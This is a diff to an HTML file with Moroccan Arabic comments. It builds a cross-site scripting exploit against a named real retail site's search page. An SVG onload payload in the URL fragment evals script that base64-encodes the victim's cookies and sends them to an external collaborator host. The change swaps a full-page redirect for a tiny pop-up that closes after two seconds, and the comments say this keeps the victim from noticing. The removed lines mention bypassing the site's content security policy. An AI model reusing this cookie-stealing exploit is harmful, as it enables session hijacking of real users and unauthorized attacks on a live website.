@@ -2,20 +2,21 @@
 <html>
 <body>
     <script>
-        // سكريبت كيهرب الداتا عن طريق تحويل الصفحة بالكامل
         let payload = `
             (function(){
-                var cookies = btoa(document.cookie);
-                var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?leak=" + cookies;
+                // كنهزو غير طرف من الكوكيز (مثلا أول 100 حرف) باش ما يجيش الرابط طويل بزاف ويبلوكيه المتصفح
+                var c = btoa(document.cookie).substring(0, 150);
+                var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?leak=" + c;
                 
-                // هاد السطر كيهرب من الـ CSP حيت كيدير Redirect كامل للمتصفح
-                window.location.replace(collab);
+                // فتح نافذة جديدة بالداتا
+                var win = window.open(collab, "_blank", "width=100,height=100");
+                
+                // سد النافذة مورا 2 ثواني باش ما يعيقش الضحية
+                setTimeout(function(){ win.close(); }, 2000);
             })();
         `;
 
         let encodedPayload = encodeURIComponent(payload);
-
-        // الرابط باستعمال الـ Hash (#) اللي نفعنا فـ الـ Bypass
         let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";
 
         window.location.href = finalTarget;
